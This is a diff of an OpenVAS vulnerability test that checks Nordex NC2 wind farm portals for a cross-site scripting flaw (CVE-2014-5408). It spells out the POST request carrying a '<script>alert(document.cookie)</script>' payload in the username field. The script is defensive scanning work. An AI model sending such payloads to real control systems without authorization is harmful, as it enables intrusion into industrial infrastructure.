@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_wind_farm_portal_nc2_xss_vuln.nasl 6663 2017-07-11 09:58:05Z teissa $
+# $Id: gb_wind_farm_portal_nc2_xss_vuln.nasl 9086 2018-03-12 11:54:08Z cfischer $
 #
 # Nordex NC2 'username' Parameter Cross Site Scripting Vulnerability
 #
@@ -27,12 +27,12 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.804789");
-  script_version("$Revision: 6663 $");
+  script_version("$Revision: 9086 $");
   script_cve_id("CVE-2014-5408");
   script_bugtraq_id(70851);
   script_tag(name:"cvss_base", value:"4.3");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
-  script_tag(name:"last_modification", value:"$Date: 2017-07-11 11:58:05 +0200 (Tue, 11 Jul 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-03-12 12:54:08 +0100 (Mon, 12 Mar 2018) $");
   script_tag(name:"creation_date", value:"2014-11-11 17:47:43 +0530 (Tue, 11 Nov 2014)");
   script_name("Nordex NC2 'username' Parameter Cross Site Scripting Vulnerability");
 
@@ -69,38 +69,26 @@ if(description)
   script_category(ACT_ATTACK);
   script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
   script_family("Web application abuses");
-  script_dependencies("find_service.nasl");
+  script_dependencies("find_service.nasl", "http_version.nasl");
   script_require_ports("Services/www", 80);
   script_exclude_keys("Settings/disable_cgi_scanning");
 
   exit(0);
 }
 
-
 include("http_func.inc");
 include("http_keepalive.inc");
 
-## Variable Initialization
-http_port = "";
-sndReq = "";
-rcvRes = "";
-
-## Get HTTP Port
 http_port = get_http_port(default:80);
 
-host = http_host_name(port:http_port);
-
-## Iterate over possible paths
 foreach dir (make_list_unique("/", "/nordex", "/nc2", cgi_dirs(port:http_port)))
 {
 
   if(dir == "/") dir = "";
 
-  ## Construct GET Request
   sndReq = http_get(item:string(dir, "/index_en.jsp"),  port:http_port);
   rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq);
 
-  ##Confirm Application
   if(">Nordex Control" >< rcvRes && ">Wind Farm" >< rcvRes)
   {
     url = eregmatch(pattern:"<form .*method=.POST. action=.([a-z0-9/]+).>", string:rcvRes);
@@ -108,17 +96,15 @@ foreach dir (make_list_unique("/", "/nordex", "/nc2", cgi_dirs(port:http_port)))
     postData = 'connection=basic&userName="><script>alert(document' +
                '.cookie)</script>&pw=&language=en';
 
+    host = http_host_name(port:http_port);
     sndReq = string("POST ", url[1], " HTTP/1.1\r\n",
                     "Host: ", host, "\r\n",
                     "Content-Type: application/x-www-form-urlencoded\r\n",
                     "Content-Length: ", strlen(postData), "\r\n",
                     "\r\n", postData, "\r\n");
+    rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq, bodyonly:FALSE);
 
-    ## Send request and receive the response
-    rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq, bodyonly:TRUE);
-
-    ## Confirm exploit worked by checking the response
-    if(rcvRes =~ "HTTP/1\.. 200" && '><script>alert(document.cookie)</script>' >< rcvRes)
+    if(rcvRes =~ "^HTTP/1\.[01] 200" && '><script>alert(document.cookie)</script>' >< rcvRes)
     {
       security_message(port:http_port);
       exit(0);
